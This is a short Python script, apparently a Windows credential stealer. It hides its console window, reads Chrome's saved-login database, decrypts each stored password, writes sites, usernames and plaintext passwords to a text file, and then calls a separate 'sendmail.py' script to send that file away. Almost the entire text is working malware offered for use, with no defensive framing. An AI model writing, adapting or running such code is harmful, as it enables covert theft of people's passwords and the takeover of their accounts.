#!/usr/bin/env python

from os import getenv
import sqlite3
import win32crypt
import os
#If we want to hide the console for whatever reason
import win32console, win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#Lets Connect to the Database
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") #Default chrome location for details
connection = conn.cursor()
conn.execute("PRAGMA busy_timeout = 300000")
connection.execute('Select action_url, username_value, password_value FROM logins')
# make the file
f = open("Chromepass.txt", "a+")

# we write to the file
f.write("Chrome Saved Passwords\n")

#Here the Crpyunprotectdata module comes into play. It decrypts the dtaa with the login credentials of the logged in user.
for result in connection.fetchall():

    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]

    if password:

        f.write('\nWebsite: '+result[0])
        f.write('\nUsername: '+result[1])
        f.write('\nPassword: ' + str(password))


    ## lets send the file now, rune the sendmail script

os.system('py sendmail.py')
